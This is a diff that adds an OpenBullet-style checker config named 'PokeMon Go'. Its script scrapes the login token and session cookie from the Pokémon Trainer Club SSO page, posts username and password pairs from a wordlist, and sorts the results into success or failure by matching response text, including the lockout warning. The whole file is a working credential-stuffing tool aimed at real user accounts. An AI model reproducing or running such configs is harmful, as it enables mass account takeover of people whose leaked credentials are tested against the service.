@@ -1,0 +1,53 @@
+[SETTINGS]
+{
+  "Name": "PokeMon Go",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-16T11:04:10.4117194-05:00",
+  "AdditionalInfo": "",
+  "Author": "FFaez1267",
+  "Version": "1.0.1",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://sso.pokemon.com/sso/login?service=https%3A%2F%2Fsso.pokemon.com%2Fsso%2Foauth2.0%2FcallbackAuthorize&locale=en_US" 
+  
+  HEADER "User-Agent: Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-N9005 Build/NJH47F)" 
+
+PARSE "<SOURCE>" LR "lt\": \"" "\"," -> VAR "TOKEN" 
+
+PARSE "<COOKIES(JSESSIONID)>" LR "" "" -> VAR "JSESSIONID" 
+
+REQUEST POST "https://sso.pokemon.com/sso/login?service=http%3A%2F%2Fsso.pokemon.com%2Fsso%2Foauth2.0%2FcallbackAuthorize&locale=en_US" 
+  CONTENT "lt=<TOKEN>&execution=e1s1&_eventId=submit&username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "JSESSIONID: <JSESSIONID>;" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "X-Unity-Version: 2017.4.6f1" 
+  HEADER "User-Agent: Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-N9005 Build/NJH47F)" 
+  HEADER "Host: sso.pokemon.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+  HEADER "Content-Length: 114" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Your username or password is incorrect. You have 3 attempts left before you will be locked out of your account for 15 minutes" 
+  KEYCHAIN Success OR 
+    KEY "applicationTime\":2,\"" 
+
